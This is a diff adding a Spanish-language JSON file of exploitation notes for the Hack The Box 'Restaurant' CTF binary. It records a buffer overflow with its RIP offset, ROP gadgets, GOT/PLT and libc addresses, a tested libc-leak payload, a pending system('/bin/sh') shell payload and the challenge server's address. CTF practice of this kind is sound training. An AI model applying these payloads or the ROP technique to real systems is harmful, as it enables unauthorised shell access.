@@ -1,0 +1,155 @@
+{
+  "reto": {
+    "nombre": "Restaurant",
+    "plataforma": "Hack The Box",
+    "categoria": "Pwn",
+    "dificultad": "Easy",
+    "servidor": {
+      "host": "94.237.48.12",
+      "puerto": 40939,
+      "timeout": 127
+    }
+  },
+  "binario": {
+    "nombre": "restaurant",
+    "arquitectura": "x86-64",
+    "tipo": "ELF 64-bit LSB executable",
+    "stripped": false,
+    "protecciones": {
+      "canary": false,
+      "nx": true,
+      "pie": false,
+      "relro": "full"
+    }
+  },
+  "vulnerabilidad": {
+    "tipo": "Buffer Overflow",
+    "funcion": "fill",
+    "direccion": "0x400e4a",
+    "buffer_size": 32,
+    "bytes_leidos": 1024,
+    "offset_a_rip": 40,
+    "severidad": "CRITICA"
+  },
+  "direcciones_binario": {
+    "funciones": {
+      "main": "0x400f68",
+      "fill": "0x400e4a",
+      "drink": "0x400eed",
+      "setup": "0x400dfd"
+    },
+    "plt": {
+      "puts": "0x400650",
+      "printf": "0x400670",
+      "read": "0x400690",
+      "scanf": "0x4006c0",
+      "alarm": "0x400680",
+      "exit": "0x4006d0"
+    },
+    "got": {
+      "puts": "0x601fa8",
+      "printf": "0x601fb8",
+      "read": "0x601fc8",
+      "scanf": "0x601fe0",
+      "alarm": "0x601fc0",
+      "exit": "0x601fe8"
+    },
+    "gadgets": {
+      "pop_rdi_ret": "0x4010a3",
+      "pop_rsi_pop_r15_ret": "0x4010a1",
+      "ret": "0x400eec"
+    }
+  },
+  "libc": {
+    "version": "GLIBC 2.27",
+    "distribucion": "Ubuntu GLIBC 2.27-3ubuntu1.4",
+    "offsets": {
+      "puts": "0x080aa0",
+      "system": "0x04f550",
+      "execve": "0x0e4c00",
+      "bin_sh": "0x1b3e1a"
+    }
+  },
+  "leak": {
+    "probado": true,
+    "funcional": true,
+    "metodo": "ROP chain: puts(puts@GOT)",
+    "extraccion": {
+      "ubicacion": "Después de 'Enjoy your ...'",
+      "formato": "6 bytes little endian",
+      "bytes_finales": "\\x7f"
+    },
+    "ejemplo": {
+      "leaked_puts": "0x7f8973f7daa0",
+      "libc_base": "0x7f8973efd000",
+      "system": "0x7f8973f4c550",
+      "bin_sh": "0x7f89740b0e1a"
+    }
+  },
+  "exploit_etapas": {
+    "etapa_1": {
+      "nombre": "Leak de Libc",
+      "estado": "COMPLETADO",
+      "probado": true,
+      "payload": [
+        "b'A' * 40",
+        "p64(0x4010a3)",
+        "p64(0x601fa8)",
+        "p64(0x400650)",
+        "p64(0x400f68)"
+      ],
+      "resultado": "Leak exitoso y retorno a main"
+    },
+    "etapa_2": {
+      "nombre": "Shell",
+      "estado": "PENDIENTE",
+      "probado": false,
+      "payload": [
+        "b'A' * 40",
+        "p64(0x4010a3)",
+        "p64(libc_base + 0x1b3e1a)",
+        "p64(libc_base + 0x04f550)"
+      ],
+      "resultado_esperado": "Shell interactiva"
+    }
+  },
+  "pruebas_realizadas": {
+    "buffer_overflow_local": true,
+    "buffer_overflow_remoto": true,
+    "control_rip": true,
+    "leak_libc": true,
+    "retorno_main": true,
+    "calculo_direcciones": true
+  },
+  "archivos_generados": [
+    "RECONOCIMIENTO_COMPLETO.md",
+    "RESUMEN_EJECUTIVO.txt",
+    "README.md",
+    "poc_leak.py",
+    "restaurant_disasm.txt",
+    "DATOS_PARA_EXPLOTACION.json"
+  ],
+  "comandos_utiles": {
+    "probar_poc": "python3 poc_leak.py",
+    "analizar_binario": "checksec --file=pwn_restaurant/restaurant",
+    "desensamblado": "objdump -M intel -d pwn_restaurant/restaurant",
+    "buscar_gadgets": "python3 -m ropper --file pwn_restaurant/restaurant --search 'pop rdi'"
+  },
+  "notas": [
+    "El servidor remoto está online y funcional",
+    "El leak funciona al 100% y es reproducible",
+    "El servidor vuelve a main automáticamente después del leak",
+    "Timeout de 127 segundos es más que suficiente",
+    "Segunda etapa requiere calcular system y /bin/sh con la base de libc"
+  ],
+  "recomendaciones_explotacion": [
+    "Usar pwntools para automatización",
+    "Implementar retry logic por si falla el leak",
+    "Validar que el leak sea una dirección válida (0x7f...)",
+    "Considerar stack alignment (puede requerir ret adicional antes de system)",
+    "Probar localmente con la libc.so.6 proporcionada antes de atacar remoto"
+  ],
+  "estado_reconocimiento": "COMPLETO",
+  "siguiente_fase": "EXPLOTACION",
+  "confianza_explotacion": "ALTA"
+}
